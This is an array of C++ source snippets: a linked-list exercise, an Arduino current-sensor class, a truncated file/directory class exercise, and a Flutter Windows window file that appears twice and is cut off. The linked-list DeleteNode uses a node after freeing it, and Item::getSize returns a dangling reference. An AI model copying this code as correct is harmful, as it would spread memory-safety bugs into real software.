    "\n#include<iostream>\nusing namespace std;\n\nclass Node {\npublic:\n\tint value;\n\tNode* next;\n\tNode* prev;\n};\n\nvoid InsertInBeginng(Node*& head, int value) {\n\tNode* new_Node = new Node();\n\tnew_Node->value = value;\n\tnew_Node->next = head;\n\thead = new_Node;\n}\n\n    \n\nNode* Find(int value, Node * head) {\n\n\twhile (head != NULL) {\n\t\tif (head->value == value) {\n\t\t\treturn head;\n\t\t}\n\t\thead = head->next;\n\t}\n\treturn NULL;\n}\n\nvoid InsterAfter(Node * prv_Node, int value) {\n\tif (prv_Node == NULL) {\n\t\tcout << \"Node is NULL\";\n\t\treturn;\n\t}\n\tNode* new_Node = new Node();\n\tnew_Node->value = value;\n\tnew_Node->next = prv_Node->next;\n\tprv_Node->next = new_Node;\n}\n\nvoid InsertAtEnd(int value, Node * &head) {\n\tNode* last = new Node();\n\tlast->value = value;\n\tlast->next = NULL;\n\tif (head == NULL) {\n\t\thead = last;\n\t\treturn;\n\t}\n\tNode* lastnode = head;\n\twhile (lastnode->next != NULL) {\n\t\tlastnode = lastnode->next;\n\t}\n\tlastnode->next = last;\n\n\n}\n\nvoid PrintList(Node * head) {\n\n\twhile (head != NULL) {\n\t\tcout << head->value << \" \";\n\t\thead = head->next;\n\t}\n}\n\nvoid DeleteNode(Node * &head, int value) {\n\n\tNode* Currently = head; Node* prev = head;\n\tif (head == NULL) {\n\t\treturn;\n\t}\n\tif (Currently->value == value) {\n\t\thead = head->next;\n\t\tdelete Currently;\n\t}\n\twhile (Currently != NULL && Currently->value != value) {\n\t\tprev = Currently;\n\t\tCurrently = Currently->next;\n\t}\n\tif (Currently == NULL) {\n\t\treturn;\n\t}\n\tprev->next = Currently->next;\n\tdelete Currently;\n\n\n}\n\nvoid DeleteFisrtNode(Node * &head) {\n\tNode* First = head;\n\tif (head == NULL) {\n\t\treturn;\n\t}\n\thead = head->next;\n\tdelete First;\n}\n\nvoid DeleteLastNode(Node * &head) {\n\tif (head == NULL) {\n\t\treturn;\n\t}\n\tNode* last = head;\n\tNode* last1 = head;\n\tif (last->next == NULL) {\n\t\thead = NULL;\n\t\tdelete last;\n\t\treturn;\n\t}\n\twhile (last->next != NULL) {\n\t\tlast1 = last;\n\t\tlast = last->next;\n\t}\n\tlast1->next = NULL;\n\tdelete last;\n\n}\n\n",
    "// reference: circuito.io and ACS712 library\n#include \"ACS712.h\"\n#include \"Arduino.h\"\n\nACS712::ACS712(const int pin) : AnalogReader(pin)\n{\n}\n/**\n * Manually calibrate current sensor.\n * calFactor - current calibration factor.\n */\nvoid ACS712::calibrate(int calFactor)\n{\n  \n  long rawVal =0;\n  for(int i=0 ; i<1000 ; i++)\n    rawVal += read();\n  int cal = rawVal / 1000;\n  Serial.println(cal);\n  if(abs(cal - calFactor) < 1)\n  {\n    Serial.print(F(\"Your calibration factor is good!\"));\n  }\n  else\n  {\n    Serial.print(F(\"Your calibration factor is: \"));\n    Serial.println(cal);\n    Serial.print(F(\"Update the calFactor variable in top of Firmware.ino and run again.\"));\n    while(true);\n  }\n  m_calFactor = cal;\n}\n\n/**\n * Get averaged current measurment.\n * cals - number of readings to average.\n * Returns - sensed current in Ampere.\n */\nfloat ACS712::getCurrent(int cals)\n{\n  float tot_adc = 0;\n  for(int i = 0; i < cals; i++){\n    tot_adc += read();\n  }  \n  float adc = tot_adc / float(cals);  \n  float voltage = adc * vcc / max;\n  float current = (voltage - (vcc / 2)) / sensitivity;\n  return current;\n}\n\n",
    "#include <iostream>\n#include <string>\n#include <vector>\n\nusing namespace std;\n\nclass Item{\nprivate:\n    string name;\npublic:\n    Item(const string &n) : name(n) {}\n\n    // methods using upcasting (converting a derived class obj to a base class obj)\n    virtual const string &getName() const // the private data member can not be modified since it's a const reference\n    {\n        return name;\n    }\n    virtual const int &getSize() const\n    {\n        return 0;\n    }\n    /* VAR1:\n    virtual ostream& display(ostream& out) const // in this case, the classes file and directory must display the assigned name, then a file must include other details\n    {\n        return out<<name;\n    } */\n    /* VAR2\n    friend ostream &operator<<(ostream &out, const Item &obj)\n    {\n        out<<obj.getName(); // name is a private member, therefore i must use getName()\n        return out;\n    }*/\n    virtual void display(ostream& out) const = 0; // pure virtual function that is also defined in the derived classes\n    friend ostream &operator<<(ostream &out, const Item &obj) // overloading operator<< only in the base class\n    {\n        obj.display(out);\n        return out;\n    }\n};\n\nclass File : public Item{\nprivate:\n    int size;\n    string extension;\npublic:\n    File(const string &n, const string &ext, int s) : Item(n), extension(ext), size(s) {}\n    File(const string &n, const string &ext) : Item(n), extension(ext) {}\n    const int &getSize() const override\n    {\n        return size;\n    }\n    const string &getExtension() const\n    {\n        return extension;\n    }\n    /* VAR1:\n    ostream& display(ostream& out) const override\n    {\n        return Item::display(out)<<\".\"<<extension<<\" \"<<size; // using scope resolution operator since we must access the method display() defined in the base class item\n    }*/\n    /* VAR2\n    friend ostream &operator<<(ostream &out, const File &obj)\n    {\n        out<<static_cast<const Item &>(obj); // upcasting since we must convert a derived class pointer to the base class pointer (any file has a name, which is an item's attribute)\n        out<<\".\"<<obj.getExtension()<<\" \"<<obj.getSize();\n        return out;\n    }*/\n    void display(ostream& out) const override\n    {\n        out<<getName()<<\".\"<<extension<<\" \"<<size;\n    }\n};\n\nclass Directory : public Item{\nprivate:\n    vector<Item *> path;\npublic:\n    Directory(const string &n) : Item(n) { path.clear(); } // there's no need to declare the vector variable here\n    ~Directory()\n    {\n        if(!this->path.empty())\n        {\n            this->path.clear();\n        }\n    }\n    void addItem(Item *obj) // pointing at an item\n    {\n        path.push_back(obj); // adding objects to the current directory path\n    }\n    Directory *navigateTo(const string& name) // function which returns a pointer to a directory\n    {\n        // for every item located within the path, declared as references\n        // might have to implement exception handling block\n        for (const auto& item : path)\n        {\n            // if the name corresponds and it is a directory\n            if (item->getName() == name && dynamic_cast<Directory*>(item)) // we must use dynamic_cast since the item should be checked whether it is a directory or not\n            {\n                return dynamic_cast<Directory*>(item);\n            }\n        }\n        return nullptr;\n    }\n    void addDirectory(const string& name)\n    {\n        Directory *new_dir = new Directory(name);\n        addItem(new_dir); // addItem() is part of the directory class methods (don't be mistaken), otherwise i should've used the scope resolution operator\n    }\n    int getNumberOfItems() // the number of direct children nodes is the size on the path vector for the current directory\n    {\n        return path.size(); // size() instead of length() since we use elements in the vector path of type pointer\n    }\n    int getSize()\n    {\n        int total_size = 0;\n        for(const auto &item : path)\n        {\n            Directory *subdir = dynamic_cast<Directory*>(item);\n            if(subdir)\n            {\n                total_size += subdir->getSize(); // sizes of files located in each subdir\n            } else\n            {\n                total_size += item->getSize();\n            }\n        }\n        return total_size;\n    }\n    void syntaxHelper(std::ostream& out, int k) const\n    {\n        for (int i = 0; i < k; i++)\n        {\n            out<<\" \"; // increasing the indentation in relation to directory-subdirectory depth\n        }\n        if (k == 1)\n        {\n            out<<\"|-\"; // hyphen = the immediate nodes located within the parent folder\n        } else if (k != 0)\n        {\n            out<<\"|_\"; // underscore = every other level of items contained in the parent's folder direct children\n        }\n    }\n    /* VAR 1/2: friend ostream &operator<<(ostream &out, const Directory &obj) // operator<< overloading\n    {\n        // the indentation is specific to every level, meaning it should be consistent for items",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S"
]